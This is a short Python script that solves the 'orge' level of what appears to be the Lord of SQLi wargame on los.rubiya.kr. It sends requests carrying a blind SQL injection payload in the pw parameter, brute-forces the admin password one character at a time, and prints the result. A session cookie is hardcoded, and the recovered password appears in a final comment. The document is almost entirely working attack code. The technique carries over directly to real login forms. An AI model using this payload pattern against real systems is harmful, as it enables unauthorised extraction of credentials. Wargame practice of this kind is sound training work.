import requests


def blindi():
	password=""
	cookies={"PHPSESSID":"2jmdje149iheon8es94327lllt"}
	for i in range(1,9):
		print("progress : "+str(i))
		for guess in range(48,123):
			print("matching with : "+chr(guess))
			URL="https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=-1' || id='admin' %26%26 substr(pw,"+str(i)+",1)='"+chr(guess)
			response = requests.get(URL,cookies=cookies)
			if "Hello admin" in response.text:
				print("order : "+str(i)+", password : "+chr(guess))
				password+=chr(guess)
				break

	print("admin password is "+password)


if __name__ == "__main__":
	print("Start orge blind-injection")
	blindi()
	# admin password is 7b751aec

